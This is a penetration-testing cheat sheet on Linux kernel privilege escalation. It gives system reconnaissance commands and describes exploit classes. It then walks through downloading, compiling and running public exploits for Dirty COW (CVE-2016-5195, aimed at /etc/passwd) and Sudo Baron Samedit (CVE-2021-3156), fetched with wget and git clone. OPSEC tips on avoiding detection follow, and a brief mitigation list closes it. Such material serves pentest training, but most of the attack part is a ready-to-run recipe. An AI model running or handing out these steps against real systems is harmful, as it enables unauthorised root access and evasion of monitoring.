# Linux Kernel Exploitation

Linux kernel vulnerabilities can provide attackers with a pathway to escalate privileges from a standard user to root. Kernel exploits target flaws in the core operating system components, allowing them to bypass traditional security controls.

Vulnerability Identification – System Information Gathering:  
<pre><code class="bash"># Kernel version information
uname -a
cat /proc/version
cat /etc/issue

# Distribution-specific version information
lsb_release -a
cat /etc/*-release

# Installed kernel packages
rpm -qa | grep kernel    # For RPM-based systems
dpkg -l | grep linux-image    # For Debian-based systems
</code></pre>

Vulnerability Identification – Common Vulnerable Configurations:  
<pre><code class="bash"># Check for vulnerable kernel modules
lsmod

# Check for enabled security features
cat /boot/config-$(uname -r) | grep CONFIG_SECURITY
cat /boot/config-$(uname -r) | grep CONFIG_SECCOMP
cat /proc/cpuinfo | grep flags | grep -E 'smep|smap'

# Check for exploit mitigations
checksec --kernel
cat /proc/sys/kernel/unprivileged_bpf_disabled
cat /proc/sys/kernel/kexec_load_disabled
cat /proc/sys/kernel/dmesg_restrict
</code></pre>

Common Kernel Exploit Categories – Use-After-Free (UAF): Occurs when the kernel continues to use memory after it has been freed, allowing attackers to manipulate memory to execute arbitrary code.

Common Kernel Exploit Categories – Race Conditions: Timing vulnerabilities where the kernel makes incorrect assumptions about the state of resources during concurrent operations.

Common Kernel Exploit Categories – Memory Corruption: Vulnerabilities that allow attackers to write to arbitrary memory locations, potentially overwriting critical kernel data structures.

Common Kernel Exploit Categories – Integer Overflows/Underflows: Mathematical errors in kernel code that can lead to buffer overflows or other memory corruption issues.

Exploitation Process – Finding Suitable Exploits:  
<pre><code class="bash"># Search for kernel exploits based on version
searchsploit linux kernel $(uname -r)

# Check exploit-db
Exploit: https://www.exploit-db.com/exploits/[exploit-id]

# Check established repositories
git clone https://github.com/xairy/kernel-exploits
git clone https://github.com/SecWiki/linux-kernel-exploits
</code></pre>

Exploitation Process – Exploit Modification and Compilation:  
<pre><code class="bash"># Install development tools if needed
apt-get install -y build-essential libelf-dev linux-headers-$(uname -r)   # Debian/Ubuntu
yum groupinstall "Development Tools"   # CentOS/RHEL

# Compile the exploit
gcc -o exploit exploit.c

# For more complex exploits with a Makefile
make
</code></pre>

Exploitation Process – Common Exploit Examples – CVE-2016-5195 (Dirty COW):  
<pre><code class="bash"># Download the exploit
wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c

# Compile
gcc -pthread pokemon.c -o dirtycow

# Run the exploit
./dirtycow /etc/passwd 0
</code></pre>

Exploitation Process – Common Exploit Examples – CVE-2021-3156 (Sudo Baron Samedit):  
<pre><code class="bash"># Clone the repository
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156

# Compile and run
make
./sudo-hax-me-a-sandwich
</code></pre>

OPSEC Considerations: Kernel exploits can crash the system if they fail; failed exploitation attempts often leave traces in system logs; many kernel exploits require specific conditions to work correctly; successful exploits may trigger security monitoring tools that detect privilege escalation; consider using stable, well-tested exploits to minimize system impact.

Mitigation Strategies: Keep the kernel and system packages updated with security patches; enable kernel security features like SMEP, SMAP, and KASLR; configure SELinux or AppArmor to restrict process capabilities; implement proper user privilege separation; use secure boot mechanisms to validate kernel integrity; monitor for suspicious process activity and privilege escalation; implement robust system auditing and log analysis; apply the principle of least privilege for all user accounts.
